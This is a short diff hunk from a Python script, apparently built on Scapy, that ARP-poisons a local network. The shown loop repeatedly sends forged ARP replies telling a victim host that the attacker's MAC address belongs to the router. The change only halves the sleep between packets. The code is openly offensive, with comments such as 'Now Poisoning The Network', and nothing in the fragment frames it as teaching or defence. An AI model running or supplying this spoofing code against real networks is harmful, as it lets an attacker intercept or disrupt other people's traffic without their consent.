@@ -24,7 +24,7 @@ signal.signal(signal.SIGINT, signal_handler)
 print("Setup Complete. Now Poisoning The Network")
 while keep_poisoning:
 
-    time.sleep(2)
+    time.sleep(1)
     # posion to be sent to the victim - says i am the router
     victim_pkt = ARP(op=ARP.is_at, hwsrc=my_mac,psrc=router_ip,hwdst=victiminfo.hwsrc, pdst=victim_ip)
     send(victim_pkt)
